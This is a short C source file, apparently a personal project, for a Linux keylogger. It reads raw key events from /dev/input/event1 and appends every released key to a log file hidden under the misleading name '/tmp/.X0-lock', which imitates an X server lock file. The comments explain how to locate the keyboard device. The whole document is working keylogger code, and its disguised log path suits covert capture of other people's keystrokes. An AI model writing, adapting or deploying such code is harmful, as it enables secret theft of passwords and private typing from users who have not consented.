/// File: keylog.c
/// 
/// Description: This program will log all the keys that are pressed on a system.
///
/// Author: Jonathan Jang
/// // // // // // // // // // // // // // // // // // // // // // // // // // // //

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOGFILE "/tmp/.X0-lock"
#define RUN 1

int main (int argc, char **argv) {
	struct input_event ev;
	
	// Users should check to make sure their keyboard is event1
	// (check to see what event keyboard is) --> cat /proc/bus/input/devices|more
	// (see listing of input dev) --> ls -l /dev/input
	int file_d = open("/dev/input/event1", O_RDONLY);

	FILE *fp = fopen(LOGFILE, "a");

	const char *keymap[] = {" RESERVED ", " ESC ", "1", "2", "3", "4", "5", "6",
							"7", "8", "9", "0", "-", "=", " BACKSPACE ", " TAB ",
							"q", "w", "e", "r", "t", "y", "u" ,"i", "o", "p", "[",
							"]", "\nENTER\n", " LEFTCTRL ", "a", "s", "d", "f", "g",
							"h", "j", "k", "l", ";", "'", "`", " LEFTSHIFT ", "\\",
							"z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
							" RIGHTSHIFT ", " KPASTERISK ", " LEFTALT ", " ",
							" CAPSLOCK ", " F1 ", " F2 ", " F3 ", " F4 ", " F5 ",
							" F6 ", " F7 ", " F8 ", " F9 ", " F10 ", " NUMLOCK ",
							" SCROLLLOCK ", " KP7 ", " KP8 ", " KP9 ", " KPMINUS ",
							" KP4 ", " KP5 ", " KP6 ", " KPPLUS ", " KP1 ", " KP2 ",
							" KP3 ", " KP0 ", " KPDOT ", " ZENKAKUHANKAKU ", " 102ND ",
							"", " F11 ", " F12 ", " RO ", " KATAKANA ", " HIRAGANA ",
							" HENKAN ", " KATAKANAHIRAGANA ", " MUHENKAN ",
							" KPJPCOMMA ", " KPENTER ", " RIGHTCTRL ", " KPSLASH ",
							" SYSRQ ", " RIGHTALT ", " LINEFEED ", " HOME ", " UP ",
							" PAGEUP ", " LEFT ", " RIGHT ", " END ", " DOWN ",
							" PAGEDOWN ", " INSERT ", " DELETE ", " MACRO ", " MUTE ",
							" VOLUMEDOWN ", " VOLUMEUP ", " POWER ", " KPEQUAL ",
							" KPPLUSMINUS ", " PAUSE ", " SCALE ", " KPCOMMA ",
							" HANGEUL ", " HANJA ", " YEN ", " LEFTMETA ", " RIGHTMETA ",
							" COMPOSE ", " STOP ", " AGAIN ", " PROPS ", " UNDO ",
							" FRONT ", " COPY ", " OPEN ", " PASTE ", " FIND ", " CUT ",
							" HELP ", " MENU ", " CALC ", " SETUP ", " SLEEP ", " WAKEUP ",
							" FILE ", " SENDFILE ", " DELETEFILE ", " XFER ", " PROG1 ",
							" PROG2 ", " WWW ", " MSDOS ", " COFFEE ", " SCREENLOCK ",
							" ROTATE_DISPLAY ", " DIRECTION ", " CYCLEWINDOWS ", " MAIL ",
							" BOOKMARKS ", " COMPUTER ", " BACK ", " FORWARD ", " CLOSECD ",
							" EJECTCD ", " EJECTCLOSECD ", " NEXTSONG ", " PLAYPAUSE ",
							" PREVIOUSSONG ", " STOPCD ", " RECORD ", " REWIND ", " PHONE ",
							" ISO ", " CONFIG ", " HOMEPAGE ", " REFRESH ", " EXIT ", " MOVE ",
							" EDIT ", " SCROLLUP ", " SCROLLDOWN ", " KPLEFTPAREN ",
							" KPRIGHTPAREN ", " NEW ", " REDO ", " F13 ", " F14 ", " F15 ",
							" F16 ", " F17 ", " F18 ", " F19 ", " F20 ", " F21 ", " F22 ",
							" F23 ", " F24 ", " PLAYCD ", " PAUSECD ", " PROG3 ", " PROG4 ",
							" DASHBOARD ", " SUSPEND ", "CLOSE ", " PLAY ", " FASTFOWARD ",
							" BASSBOOST ", " PRINT ", " HP ", " CAMERA ", " SOUND ", " QUESTION ",
							" EMAIL ", " CHAT ", " SEARCH ", " CONNECT ", " FINANCE ", " SPORT ",
							" SHOP ", " ALTERBASE ", " CANCEL ", " BRIGHTNESSDOWN ",
							" BRIGHTNESSUP ", " MEDIA ", " SWITCHVIDEOMODE ", " KBDILLUMTOGGLE ",
							" KBDILLUMDOWN ", " KBDILLUMUP ", " SEND ", " REPLY ",
							" FORWARDMAIL ", " SAVE ", " DOCUMENTS ", " BATTERY ",
							" BLUETOOTH ", " WLAN ", " UWB ", " UNKNOWN ", " VIDEO_NEXT ",
							"VIDEO_PREV", " BRIGHTNESS_CYCLE ", " BRIGHTNESS_AUTO ",
							" DISPLAY_OFF ", " WWAN ", " WIMAX ", " RFKILL ", " MICMUTE "};

	while (RUN) {
		
		read(file_d, &ev, sizeof(ev));
		
		// To catch the keypresses
		// https://www.kernel.org/doc/Documentation/input/input.txt
		// 		(0 == Release | 1 == Keypress | 2 == autorepeat)
		// Keycodes --> (/usr/include/linux/input-event-codes.h)
		if ( (ev.type == EV_KEY) && (ev.value == 0) ){
			fflush(fp);
			fprintf(fp, "%s", keymap[ev.code]);
		}
	}
	fclose(fp);
	close(file_d);
}
